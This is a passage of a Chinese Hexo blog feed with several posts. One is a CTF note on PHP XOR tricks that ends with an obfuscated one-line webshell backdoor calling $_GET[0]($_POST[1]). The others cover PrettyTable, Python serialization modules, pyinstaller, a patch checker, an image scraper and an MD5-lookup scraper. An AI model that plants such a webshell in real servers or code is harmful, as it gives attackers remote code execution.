    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>今天在一个在线靶场上做题，发现了一个没有数字和字母组成的一句话！<br>很好奇，也看不懂，就去求助了某世。。。<br>转来转去一个钟后，emm，终于看懂了</p><a id="more"></a><hr><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><pre><code class="php">echo &#39;`&#39; ^ `?`; // 输出：_</code></pre><p>可以看到，输出的结果是字符：<code>_</code></p><p>之所以会得到这样的结果，是对字符进行了异或运算</p><blockquote><p>Ps：在PHP中，两个变量进行异或时，会进行如下操作</p><p>字符 &gt;&gt; ASCII码  &gt;&gt;  二进制  &gt;&gt;  异或 &gt;&gt; 二进制 &gt;&gt; ASCII码 &gt;&gt; 字符</p><p>异或操作有时也被用来交换两个变量的值</p></blockquote><p><strong>什么是异或？</strong></p><p>对等长二进制模式按位或二进制的每一位执行逻辑按位异或操作</p><p>操作的结果如果某位不同则该位为1，否则为0</p><pre><code class="php">1 ^ 0 = &gt;&gt;&gt; 1 0 ^ 1 = &gt;&gt;&gt; 1</code></pre><blockquote><p>其他情况就是 0</p></blockquote><p>再继续看上面的例子</p><pre><code class="php">echo &#39;`&#39; ^ `?`;</code></pre><p>`：ASCII码（96），二进制（1100000）</p><p>?：ASCII码（63），二进制（111111）</p><pre><code>11000000111111--------1011111</code></pre><p>我们可以尝试一些看看是否结果是对的</p><pre><code class="php">echo &#39;`ASCII码：&#39;.ord(&#39;`&#39;).&#39;，二进制：&#39;.decbin(ord(&#39;`&#39;));echo &#39;&lt;br /&gt;&#39;;echo &#39;?ASCII码：&#39;.ord(&#39;?&#39;).&#39;，二进制：&#39;.decbin(ord(&#39;?&#39;));echo &#39;&lt;br /&gt;&#39;;$n = &quot;`&quot; ^ &quot;?&quot;;echo &#39;` ^ ? 结果：&#39;.$n;echo &#39;&lt;br /&gt;&#39;;echo &#39;_ASCII码：&#39;.ord(&#39;_&#39;).&#39;，二进制：&#39;.decbin(ord(&#39;_&#39;));</code></pre><p>PHP是弱类型语言，也就是说PHP中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作</p><p>利用这一特点：将整形转字符串，布尔值转整</p><p>然而，我们发现这样一样一一比对太麻烦了，我们可以写一个脚本进行输出</p><pre><code class="php">$x = [&#39;`&#39;,&#39;!&#39;,&#39;@&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;^&#39;,&#39;&amp;&#39;,&#39;*&#39;,&#39;(&#39;,&#39;)&#39;,&#39;_&#39;,&#39;{&#39;,&#39;}&#39;,&#39;?&#39;,&#39;&gt;&#39;,&#39;&lt;&#39;,&#39;;&#39;,];foreach ($x as $k) {    foreach ($x as $w) {        $n = $k ^ $w;        echo $k . &quot;^&quot; . $w . &quot;：&quot; . @hex2bin(dechex(ord($n)));        echo &#39;&lt;br /&gt;&#39;;    }}</code></pre><p>从中，你有目的的选择异或后，你需要的字符，进行排列组合</p><p>例如一下的已知一句话后门</p><pre><code class="php">@$_++;$__ = (&quot;`&quot; ^ &quot;?&quot;) . (&quot;:&quot; ^ &quot;}&quot;) . (&quot;%&quot; ^ &quot;`&quot;) . (&quot;{&quot; ^ &quot;/&quot;); // _GET$___ = (&quot;$&quot; ^ &quot;{&quot;) . (&quot;~&quot; ^ &quot;.&quot;) . (&quot;/&quot; ^ &quot;`&quot;) . (&quot;-&quot; ^ &quot;~&quot;) . (&quot;(&quot; ^ &quot;|&quot;); // _POST${$__}[!$_](${$___}[$_]); // $_GET[0]($_POST[1])</code></pre>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PrettyTable</title>
    <link href="/2019/08/19/Python/import/PrettyTable/"/>
    <url>/2019/08/19/Python/import/PrettyTable/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-安装"><a href="#0X00-安装" class="headerlink" title="0X00 安装"></a>0X00 安装</h2><pre><code>pip install prettytable</code></pre><h2 id="0X01-创建表"><a href="#0X01-创建表" class="headerlink" title="0X01 创建表"></a>0X01 创建表</h2><h3 id="1-直接创建"><a href="#1-直接创建" class="headerlink" title="(1).直接创建"></a>(1).直接创建</h3><pre><code class="python">x = PrettyTable()</code></pre><a id="more"></a><p>例：</p><pre><code>x = PrettyTable([&quot;姓名&quot;,&quot;性别&quot;,&quot;年龄&quot;,&quot;存款&quot;])print x</code></pre><p><img src="/images/Python/PrettyTable%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5C0.png" srcset="/img/loading.gif" alt=""></p><h3 id="2-从已有文件创建"><a href="#2-从已有文件创建" class="headerlink" title="(2).从已有文件创建"></a>(2).从已有文件创建</h3><h4 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h4><pre><code>from prettytable import from_csv fp = open(&quot;mytable.csv&quot;, &quot;r&quot;) pt = from_csv(fp) fp.close()</code></pre><h4 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h4><pre><code>from prettytable import from_html pts = from_html(html_string)</code></pre><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><pre><code>from prettytable import from_db_cursor db_cur.execute(&quot;SELECT * FROM mytable&quot;) pt = from_db_cursor(db_cur)</code></pre><h2 id="0x02-添加元素"><a href="#0x02-添加元素" class="headerlink" title="0x02 添加元素"></a>0x02 添加元素</h2><h3 id="1-按行添加-add-row"><a href="#1-按行添加-add-row" class="headerlink" title="(1).按行添加 .add_row()"></a>(1).按行添加 <code>.add_row()</code></h3><h3 id="2-按列添加-add-column"><a href="#2-按列添加-add-column" class="headerlink" title="(2).按列添加 .add_column()"></a>(2).按列添加 <code>.add_column()</code></h3><p>例:</p><pre><code class="python">from prettytable import PrettyTablex = PrettyTable([&quot;姓名&quot;, &quot;性别&quot;, &quot;年龄&quot;, &quot;存款&quot;])x.add_row([&quot;赵一&quot;,&quot;男&quot;, 20, 100000])x.add_row([&quot;钱二&quot;,&quot;男&quot;, 21, 500])</code></pre><p><img src="/images/Python/PrettyTable%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5C1.png" srcset="/img/loading.gif" alt=""></p><h2 id="0x03-输出格式"><a href="#0x03-输出格式" class="headerlink" title="0x03 输出格式"></a>0x03 输出格式</h2><h3 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h3><p>直接输出 <code>print x</code><br>无表框输出 <code>print pt.get_string()</code></p><h3 id="HTML表-print-pt-get-html-string"><a href="#HTML表-print-pt-get-html-string" class="headerlink" title="HTML表 print pt.get_html_string()"></a>HTML表 <code>print pt.get_html_string()</code></h3><h2 id="0x04-控制表样式"><a href="#0x04-控制表样式" class="headerlink" title="0x04 控制表样式"></a>0x04 控制表样式</h2><h4 id="自带样式"><a href="#自带样式" class="headerlink" title="自带样式"></a>自带样式</h4><pre><code>#参数还可以选择“DEFAULT”、“PLAIN_COLUMNS”from prettytable import MSWORD_FRIENDLYx.set_style(MSWORD_FRIENDLY) print(x)</code></pre><h4 id="手动控制样式"><a href="#手动控制样式" class="headerlink" title="手动控制样式"></a>手动控制样式</h4><pre><code>border - 布尔类型参数（必须是True或False）。控制表格边框是否显示。header - 布尔类型参数（必须是True或False）。控制表格第一行是否作为表头显示。header-style - 控制表头信息的大小写。允许的参数值：“cap”（每个单词首字母大写），“title”（除了介词助词首字母大写），“lower”（全部小写）或者None（不改变原内容格式）。默认参数为None。hrules - 设置表格内部水平边线。允许的参数值：FRAME，ALL，NONE。注意这些是在prettytable模块内部定义的变量，在使用之前导入或用类似prettytable.FRAME的方法调用。vrules - 设置表格内部竖直边线。允许的参数值：FRAME，ALL，NONE。align - 水平对齐方式（None，“l”（左对齐），“c”（居中），“r”右对齐）valign - 垂直对齐方式（None，“t”（顶部对齐），“m”（居中），“b”底部对齐）int_format - 控制整型数据的格式。float_format - 控制浮点型数据的格式。padding_width - 列数据左右的空格数量。（当左右padding未设置时生效）left_padding_width - 列数据左侧的空格数量。right_padding_width - 列数据右侧的空格数量。vertical_char - 绘制竖直边线的字符，默认为“|”horizontal_char - 绘制水平边线的字符，默认为“-”junction_char - 绘制水平竖直交汇点的字符，默认为“+”</code></pre><p>用法:</p><pre><code>x = PrettyTable() x.border = False x.header = False x.padding_width = 5</code></pre><p>例如:</p><pre><code>from prettytable import PrettyTablex = PrettyTable([&quot;姓名&quot;,&quot;性别&quot;,&quot;年龄&quot;,&quot;存款&quot;])x.align[&quot;姓名&quot;] = &quot;1&quot;x.add_row([&quot;赵一&quot;,&quot;男&quot;, 20, 100000])x.add_row([&quot;钱二&quot;,&quot;男&quot;, 21, 500])print x</code></pre><p><img src="/images/Python/PrettyTable%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5C2.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python序列化模块</title>
    <link href="/2019/08/19/Python/import/%E5%BA%8F%E5%88%97%E5%8C%96%E6%A8%A1%E5%9D%97/"/>
    <url>/2019/08/19/Python/import/%E5%BA%8F%E5%88%97%E5%8C%96%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>序列化：将原本的字典，列表等内容转换成一个字符串的过程<br>反序列化：从字符串转换成数据类型的过程</p><p><strong>序列化的目的</strong></p><ul><li>以某种存储形式使自定义对象持久化</li><li>将对象从一个地方传递到另一个地方</li><li>使程序更具维护性</li></ul><a id="more"></a><p><strong>常用模块</strong></p><ul><li><p>json</p><blockquote><p>通用的序列化格式<br>只有很少的一部分数据类型能够通过json转换成字符串</p></blockquote></li><li><p>pickle</p><blockquote><p>所有的python中的数据类型都可转化成字符串形式<br>pickle序列化的内容只有python能理解<br>且部分反序列化依赖代码</p></blockquote></li><li><p>shelve</p><blockquote><p>序列化句柄<br>使用句柄直接操作，非常方便</p></blockquote></li></ul><hr><h1 id="json"><a href="#json" class="headerlink" title="json"></a>json</h1><p>可以转换的数据类型：数字，字符串，列表，字典，元组</p><p>Json模块提供了四个功能</p><ul><li>dumps – 序列化方法</li><li>loads – 反序列化方法</li><li>dump – 序列化，并写入文件</li><li>load – 只接收文件文件描述符，完成读取文件和反序列化</li></ul><h2 id="dumps-和-loads"><a href="#dumps-和-loads" class="headerlink" title="dumps 和 loads"></a>dumps 和 loads</h2><p>dumps格式</p><pre><code>def dumps(obj, skipkeys=False, ensure_ascii=True, check_circular=True,allow_nan=True, cls=None, indent=None, separators=None,default=None, sort_keys=False, **kw):pass参数说明：skipkeys：默认值时False，如果dict的keys内的数据不是python的基本类型，设置为False时，就会报TypeError的错误。此时设置成True，则会跳过这类keyensure_ascii：当它为True的时候，所有非ASCII码字符显示为\uXXXX序列，只需在dump时将ensure_ascii设置为False即可indent：应该是一个非负的整型，如果是0就是顶格分行显示，如果为空就是一行最紧凑显示，否则会换行且按照indent的数值显示前面的空白分行显示separators：分隔符，实际上是(item_separator, dict_separator)的一个元组，默认的就是(‘,’,’:’)；这表示dictionary内keys之间用“,”隔开，而KEY和value之间用“：”隔开sort_keys：将数据根据keys的值进行排序</code></pre><pre><code class="python"># 序列化与反序列化import jsondict = {&#39;k1&#39;:&#39;v1&#39;}x = json.dumps(dict)print(json.loads(x))</code></pre><blockquote><p>dumps序列化时对中文默认使用的ascii编码，想输出真正的中文需要指定<code>ensure_ascii=False</code></p></blockquote><h2 id="dump-和-load"><a href="#dump-和-load" class="headerlink" title="dump 和 load"></a>dump 和 load</h2><blockquote><p>Tips：每次读取和写入最好都是一条一条的</p></blockquote><pre><code class="python">import jsonf = open(&#39;json_file&#39;,&#39;w&#39;)dic = {&#39;k1&#39;:&#39;v1&#39;,&#39;k2&#39;:&#39;v2&#39;,&#39;k3&#39;:&#39;v3&#39;}json.dump(dic,f) #dump方法接收一个文件句柄，直接将字典转换成json字符串写入文件 f.close()f = open(&#39;json_file&#39;)dic2 = json.load(f) #load方法接收一个文件句柄，直接将文件中的json字符串转换成数据结构返回f.close() print(type(dic2),dic2)</code></pre><p>利用dumps 和 loads写入和读取</p><pre><code class="python">import json# 写入l = [{&#39;k&#39;:&#39;111&#39;},{&#39;k2&#39;:&#39;22&#39;},{&#39;k3&#39;:&#39;22&#39;}]f = open(&#39;pass.txt&#39;,&#39;w&#39;,encoding=&#39;utf-8&#39;)for dic in l:    str_dic = json.dumps(dic)    f.write(str_dic+&#39;\n&#39;)f.close()# 读取l = []for line in f:    dic = json.loads(line.strip())    l.append(dic)l.close</code></pre><hr><h1 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h1><p>json：用于字符串和python数据类型间进行转换<br>pickle：用于python特有的类型和python的数据类型间进行转换</p><p>pickle模块提供了四个功能：dumps，dump，loads，load</p><blockquote><p>Tips：<br>可以把python中任意的数据类型序列化<br>由于是二进制内容，需要在每个模式后面加b进行写入<br>支持分批次load<br>都是二进制的</p></blockquote><h2 id="dumps"><a href="#dumps" class="headerlink" title="dumps"></a>dumps</h2><pre><code class="python">pickle.dumps(obj[, protocol])</code></pre><p>将obj对象序列化为string形式，而不是存入文件中</p><h2 id="loads"><a href="#loads" class="headerlink" title="loads"></a>loads</h2><pre><code class="python">pickle.loads(string)</code></pre><p>反序列化</p><blockquote><p>Tips：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读取这些对象</p></blockquote><h2 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h2><pre><code class="python">pickle.dump(obj,file,[protocol])</code></pre><blockquote><p>参数说明：<br>obj：想要序列化的obj对象<br>file：文件名称<br>protocol：序列化使用的协议,如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本</p></blockquote><h2 id="load"><a href="#load" class="headerlink" title="load"></a>load</h2><pre><code class="python">pickle.load(file)</code></pre><p>将file中的对象序列化读取</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre><code class="python">import pickledic = {&#39;k1&#39;:&#39;v1&#39;,&#39;k2&#39;:&#39;v2&#39;}str_dic = pickle.dumps(dic,)print(str_dic)dic2 = pickle.loads(str_dic)print(dic2)</code></pre><hr><h1 id="shelve"><a href="#shelve" class="headerlink" title="shelve"></a>shelve</h1><p>比pickle用起来更简单<br>将对象保存到文件里面，缺省(即默认)的数据存储文件是二进制</p><ul><li>用法<blockquote><p>使用时，只需要使用open函数获取一个shelf对象，然后对数据进行增删改查操作<br>在完成工作，并且将内存存储到磁盘中，最后调用close函数变回将数据写入文件</p></blockquote></li></ul><h2 id="shelve-open"><a href="#shelve-open" class="headerlink" title="shelve.open"></a>shelve.open</h2><p>创建或打开一个shelve对象<br>shelve默认打开方式支持同时读写操作</p><pre><code>shelve.open(filename, flag=’c’, protocol=None, writeback=False)# 参数说明* filenam：关联的文件路径* flag [可选]：默认为‘c’，如果数据文件不存在，就创建，允许读写；可以是: ‘r’: 只读；’w’: 可读写; ‘n’: 每次调用open()都重新创建一个空的文件，可读写* protocol：是序列化模式，默认值为None。具体还没有尝试过，从pickle的资料中查到以下信息【protocol的值可以是1或2，表示以二进制的形式序列化】* writeback：默认为False。当设置为True以后，shelf将会将所有从DB中读取的对象存放到一个内存缓存。当我们close()打开的shelf的时候，缓存中所有的对象会被重新写入DB</code></pre><p>由于shelve在默认情况下是不会记录待持久化对象的任何修改的，所以我们在shelve.open()时候需要修改默认参数，否则对象的修改不会保存(writeback参数)</p><blockquote><p>writeback缺点：使用writeback以后，shelf在open()的时候会增加额外的内存消耗，并且当DB在close()的时候会将缓存中的每一个对象都写入到DB，这也会带来额外的等待时间。因为shelve没有办法知道缓存中哪些对象修改了，哪些对象没有修改，因此所有的对象都会被写入<br>为了保存增，删，改的内容，建议显示的标明writeback=True</p></blockquote><p><strong>shelve模块限制</strong></p><blockquote><p>它不支持多个应用同一时间往同一个DB（文件）进行写操作，所以如果只需进行读操作，可以修改默认参数<code>flag=’r’</code> 让shelve通过只读方式打开DB（文件）<br>python2.7有效</p></blockquote><p>存储文件在键(如果使用现有的key，将会覆盖旧数据)<br>格式：<code>文件句柄[key] = data</code></p><pre><code class="python">import shelved = shelve.open(&#39;pass&#39;)# d[&#39;key&#39;] = [&#39;xxx&#39;,&#39;aaa&#39;]# d.close()</code></pre><p>取出数据的时候也只需要直接用key获取即可，但是如果key不存在会报错</p><pre><code class="python">import shelved = shelve.open(&#39;pass&#39;)existing = d[&#39;key&#39;]d.close()print(existing)</code></pre><p>writeback(没开的情况下，增，删，改都不会记录)</p><pre><code class="python">import shelve# 没开的情况d = shelve.open(&#39;pass&#39;)d[&#39;key&#39;] = [&#39;1111&#39;,&#39;2222&#39;]d[&#39;key&#39;].append(&#39;333&#39;)print(d[&#39;key&#39;])结果：[&#39;1111&#39;, &#39;2222&#39;]# 开d = shelve.open(&#39;pass&#39;,writeback=True)d[&#39;key&#39;] = [&#39;1111&#39;,&#39;2222&#39;]d[&#39;key&#39;].append(&#39;333&#39;)print(d[&#39;key&#39;])结果：[&#39;1111&#39;, &#39;2222&#39;, &#39;333&#39;]</code></pre><h2 id="shelve-close"><a href="#shelve-close" class="headerlink" title="shelve.close"></a>shelve.close</h2><pre><code class="python">shelve.close()</code></pre><p>同步关闭shelve对象</p><blockquote><p>Tips：每次使用完毕，都必须确保shelve对象被安全关闭，同样可以使用with语句</p></blockquote><pre><code class="python">with shelve.open(&#39;span&#39;) as db:    db[&#39;eggs&#39;] = &#39;eggs&#39;</code></pre><h2 id="只读"><a href="#只读" class="headerlink" title="只读"></a>只读</h2><pre><code>import shelvef = shelve.open(&#39;shelve_file&#39;, flag=&#39;r&#39;)existing = f[&#39;key&#39;]f.close()print(existing)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python打包成exe文件</title>
    <link href="/2019/08/19/Python/python%E8%BD%ACexe/"/>
    <url>/2019/08/19/Python/python%E8%BD%ACexe/</url>
    
    <content type="html"><![CDATA[<h1 id="安装-pyinstaller"><a href="#安装-pyinstaller" class="headerlink" title="安装 pyinstaller"></a>安装 pyinstaller</h1><pre><code>pip install pyinstaller</code></pre><blockquote><p>Ps：支持python2.7-3.6版本</p></blockquote><h1 id="运用"><a href="#运用" class="headerlink" title="运用"></a>运用</h1><blockquote><p>格式：<code>pyinstaller 参数 *.py</code></p></blockquote><p>参数说明</p><ul><li>-i 图标路径</li><li>-F 独立exe程序</li><li>-w 使用窗口，无控制台</li><li>-c 使用控制台，无窗口</li><li>-D 创建一个目录，里面包含exe以及其他一些依赖性文件</li><li>–clean 清理打包过程中的临时文件</li><li>-p 天剑python文件使用的第三方库路径</li></ul><p>目录说明</p><ul><li>build 是pyinstaller存储临时文件的目录</li><li>dist 打包程序所在目录</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>补丁检测</title>
    <link href="/2019/08/19/Python/%E8%A1%A5%E4%B8%81%E6%A3%80%E6%B5%8B/"/>
    <url>/2019/08/19/Python/%E8%A1%A5%E4%B8%81%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>仿照即刻安全-九世的文章<br>参考链接：<a href="https://www.cnblogs.com/haq5201314/p/9161618.html" target="_blank" rel="noopener">https://www.cnblogs.com/haq5201314/p/9161618.html</a></p><p>识别windows的未打补丁</p><a id="more"></a><hr><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>在cmd中输入<code>systeminfo</code>，并自动写入为txt文件</li><li>判断系统补丁信息文件和危害补丁文件是否存在</li><li>两个文件进行对比，没有的则打出来</li></ul><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><pre><code class="python">#coding:utf-8import osimport reimport optparsedef main():    parser = optparse.OptionParser()    parser.add_option(&#39;-w&#39;, dest=&#39;windows&#39;, help=&#39;-w [filename] View windows&#39;)    (options,args) = parser.parse_args()    if options.windows:        win()        filename = options.windows        windows(filename)    else:        parser.print_help()        exit()# 将win系统补丁信息进行提取def win():    info = os.popen(&quot;systeminfo&quot;)    win_info = info.read()    res = re.compile(&#39;KB\d+&#39;)    result = res.findall(win_info)    f = open(&#39;win_info.txt&#39;,&#39;w&#39;)    for i in result:        f.write(i+&#39;\n&#39;)    f.close()# 判断文件是否存在def exists(filename):    File_exists = os.path.exists(filename)    info_exists = os.path.exists(&#39;win_info.txt&#39;)    if File_exists == True and info_exists == True:        exists = &#39;success&#39;        return exists    else:        exists = &#39;failure&#39;        return exists# 将文本中的内容存入字典中def win_re(filename):    lists = []    win = open(filename,&#39;r&#39;)    res = re.compile(&#39;KB\d+&#39;)    for i in win:        result = res.findall(i)        for k in result:            lists.append(k)    win.close()    list = []    info = open(&#39;win_info.txt&#39;, &#39;r&#39;)    for i in info:        list.append(i.strip(&#39;\n&#39;))    info.close()    return lists, listdef windows(filename):    file_exists = exists(filename)    if file_exists == &#39;success&#39;:        print(&#39;[+] {} exists&#39;.format(filename))    else:        print(&#39;[-] {} Not exists&#39;.format(filename))        exit()    x = win_re(filename)    for v in x[0]:        if v in x[1]:            pass        else:            print(&quot;[*] &quot; + v)if __name__ == &#39;__main__&#39;:    main()</code></pre><hr>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python-爬取美女图片</title>
    <link href="/2019/08/19/Python/%E7%88%AC%E5%8F%96%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/"/>
    <url>/2019/08/19/Python/%E7%88%AC%E5%8F%96%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-扯淡"><a href="#0x00-扯淡" class="headerlink" title="0x00 扯淡"></a>0x00 扯淡</h3><p>博客昨天才刚刚搭建好,觉得很空也不知道要放什么内容,毕竟我很菜<br>然而昨晚想起来,经常有一些人,刚刚学完基础的爬虫,就会去爬一些图片<br>所以我也去弄些美女图片回来当成福利,嘿嘿…<br>刚刚好可以利用刚刚学的bs4来试试<br>当然网站我是随便百度的来的….</p><a id="more"></a><h3 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h3><p>1.利用urllib2去模拟浏览器访问网页 并且用BeautifulSoup模块获取目标网站的对象<br>2.利用re解析出图片的地址<br>3.循环解析出来的地址,利用urllib.urlretrieve()进行保存到本地</p><h3 id="0x02-苦逼写代码啊"><a href="#0x02-苦逼写代码啊" class="headerlink" title="0x02 苦逼写代码啊"></a>0x02 苦逼写代码啊</h3><h4 id="1-利用urllib2去模拟浏览器访问网页"><a href="#1-利用urllib2去模拟浏览器访问网页" class="headerlink" title="1.利用urllib2去模拟浏览器访问网页"></a>1.利用urllib2去模拟浏览器访问网页</h4><p>首先导入需要用到的四个模块</p><pre><code class="python">import urllib2import urllibimport refrom bs4 import BeautifulSoup</code></pre><p>然后利用urllib2去访问浏览器</p><pre><code class="python">header = {    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&#39;}r = urllib2.Request(url,headers=header)html = urllib2.urlopen(r).read().decode(&#39;gbk&#39;)# header 主要用于防止网站对爬虫做了限制#进行编码是因为获取的源代码中文会进行乱码,强迫症没法治了。。</code></pre><p>创建BeautifulSoup对象</p><pre><code class="python">comm = BeautifulSoup(html,&quot;html.parser&quot;)</code></pre><h4 id="2-解析图片的地址"><a href="#2-解析图片的地址" class="headerlink" title="2.解析图片的地址"></a>2.解析图片的地址</h4><p>我们先看下源代码<br><img src="/images/Python/%E7%88%AC%E5%8F%96%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/1.png" srcset="/img/loading.gif" alt=""></p><p>发现图片的地址是包含在<code>img</code>标签下的<code>src</code>属性中<br>接下来就是解析出img标签</p><pre><code class="python">img = comm.find_all(&#39;img&#39;)</code></pre><p>然后定义用来显示文件名字的数字<br>毕竟不可能所有的图片都用1.jpg显示吧。。。</p><pre><code class="python">x = 0img_list = []</code></pre><h4 id="3-用re获取图片地址并循环保存图片"><a href="#3-用re获取图片地址并循环保存图片" class="headerlink" title="3.用re获取图片地址并循环保存图片"></a>3.用re获取图片地址并循环保存图片</h4><pre><code>for i in img:    result = re.findall(r&#39;src=&quot;(.*?)&quot; width=&quot;234&quot;/&gt;&#39;,str(i))    for j in result:        img_list.append(j)        urllib.urlretrieve(j,filename=&#39;%s.jpg&#39;%x)        x = x + 1        print j</code></pre><h4 id="4-最后用def提高一点可读性"><a href="#4-最后用def提高一点可读性" class="headerlink" title="4.最后用def提高一点可读性"></a>4.最后用def提高一点可读性</h4><pre><code class="python">#coding:utf-8import urllib2import urllibimport refrom bs4 import BeautifulSoupdef get_soup(url):    #获取目标网站的对象    header = {        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&#39;    }    r = urllib2.Request(url,headers=header)    html = urllib2.urlopen(r).read().decode(&#39;gbk&#39;)    comm = BeautifulSoup(html,&quot;html.parser&quot;)    return commdef get_img(url):    comm = get_soup(url)    img = comm.find_all(&#39;img&#39;)    x = 0    img_list = []    for i in img:        result = re.findall(r&#39;src=&quot;(.*?)&quot; width=&quot;234&quot;/&gt;&#39;,str(i))        for j in result:            img_list.append(j)            urllib.urlretrieve(j,filename=&#39;%s.jpg&#39;%x)            x = x + 1            print jif __name__ == &#39;__main__&#39;:    url = &#39;http://www.mmonly.cc/tag/cs/&#39;    get_img(url)</code></pre><h2 id="本来还想上传视频来着-结果本人买不起储存的云啊…-就不了了之-溜了。。。"><a href="#本来还想上传视频来着-结果本人买不起储存的云啊…-就不了了之-溜了。。。" class="headerlink" title="本来还想上传视频来着,结果本人买不起储存的云啊….就不了了之,溜了。。。"></a>本来还想上传视频来着,结果本人买不起储存的云啊….就不了了之,溜了。。。</h2>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬取md5解密结果-python</title>
    <link href="/2019/08/19/Python/%E7%88%AC%E5%8F%96md5%E8%A7%A3%E5%AF%86%E7%BB%93%E6%9E%9C/"/>
    <url>/2019/08/19/Python/%E7%88%AC%E5%8F%96md5%E8%A7%A3%E5%AF%86%E7%BB%93%E6%9E%9C/</url>
    
    <content type="html"><![CDATA[<h3 id="0x0-起源"><a href="#0x0-起源" class="headerlink" title="0x0 起源"></a>0x0 起源</h3><p>  今天看群里有个小伙伴也在写这个，我自己也没有什么事做<br>  闲的蛋疼就也来写，可能有些地方会有点雷同<br>  他是利用 bs4 来获取的，并不局限于利用re<br>  附上他的博客文章: <code>http://www.cnblogs.com/haq5201314/p/8459587.html</code></p><a id="more"></a><h3 id="0x1思路"><a href="#0x1思路" class="headerlink" title="0x1思路:"></a>0x1思路:</h3><p>  1.利用burp 截取 网站post提交的数据<br>  2.利用 requesst.post 模拟浏览器访问 获取返回内容<br>  3.通过正则筛选 md5 解密结果</p><h3 id="0x2正文"><a href="#0x2正文" class="headerlink" title="0x2正文"></a>0x2正文</h3><h4 id="1-利用burp-截取-网站post-提交密文的数据"><a href="#1-利用burp-截取-网站post-提交密文的数据" class="headerlink" title="1.利用burp 截取 网站post 提交密文的数据"></a>1.利用burp 截取 网站post 提交密文的数据</h4><p><img src="/images/Python/%E7%88%AC%E5%8F%96md5%E8%A7%A3%E5%AF%86%E7%BB%93%E6%9E%9C/1.png" srcset="/img/loading.gif" alt=""></p><h4 id="2-利用-requests-post-访问网站-并获取返回内容"><a href="#2-利用-requests-post-访问网站-并获取返回内容" class="headerlink" title="2.利用 requests.post 访问网站 并获取返回内容"></a>2.利用 requests.post 访问网站 并获取返回内容</h4><pre><code>import requestsimport re import sysurl = &#39;http://pmd5.com&#39;   #目标网站data = {            &#39;__VIEWSTATE&#39;: &#39;/wEPDwUKMTM4NTE3OTkzOWRkP4hmXYtPPhcBjbupZdLOLfmeTK4=&#39;,            &#39;__VIEWSTATEGENERATOR&#39;: &#39;CA0B0334&#39;,            &#39;__EVENTVALIDATION&#39;: &#39;/wEWAwK75ZuyDwLigPTXCQKU9f3vAheUenitfEuJ6eGUVe2GyFzb7HKC&#39;,            &#39;key&#39;: &#39;7a57a5a743894a0e&#39;,            &#39;jiemi&#39;: &#39;MD5解密&#39;        }#key处 为需要解密的md5密文，在后面我们改成可以修改的r = requests.post(url=url,data=data)con = r.text</code></pre><h4 id="3-通过正则筛选-md5-解密结果"><a href="#3-通过正则筛选-md5-解密结果" class="headerlink" title="3.通过正则筛选 md5 解密结果"></a>3.通过正则筛选 md5 解密结果</h4><p><img src="/images/Python/%E7%88%AC%E5%8F%96md5%E8%A7%A3%E5%AF%86%E7%BB%93%E6%9E%9C/2.png" srcset="/img/loading.gif" 